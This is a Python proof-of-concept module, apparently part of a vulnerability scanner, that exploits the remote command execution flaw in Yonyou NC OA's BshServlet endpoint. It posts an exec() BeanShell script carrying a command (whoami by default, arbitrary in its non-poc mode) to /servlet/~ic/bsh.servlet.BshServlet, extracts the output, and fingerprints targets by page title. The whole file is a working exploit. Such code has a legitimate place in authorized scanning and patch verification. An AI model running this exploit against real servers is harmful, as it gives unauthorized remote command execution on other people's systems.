# 用友OA_bshServlet命令执行
import re

from ServiceScanModel.models import ServiceScan
from ..requestClass import Requests


class POC:
    def __init__(self, service: ServiceScan):
        self.service = service
        self.requestUtil = Requests(service.cookies)
        self.result = False

    def bsh_rce(self, nc_url, cmd="whoami", type="poc"):
        try:
            resp = self.requestUtil.post(nc_url + "/servlet/~ic/bsh.servlet.BshServlet",
                                    data={"bsh.script": 'exec("%s")' % cmd})
            if "Script Output" in resp.text:
                cmd_output = re.findall('<pre>(.*?)</pre>', resp.text, re.DOTALL)[0].strip()
                if type == "poc":
                    result = ["用友OA_BshServlet接口泄露", "cmd: whoami<br>output: " + cmd_output]
                else:
                    result = cmd_output
            else:
                result = []

        except:
            result = []
        return result

    def fingerprint(self):
        if self.service.title == "YONYOU NC":
            return True

    def poc(self):
        return self.bsh_rce(self.service.url)
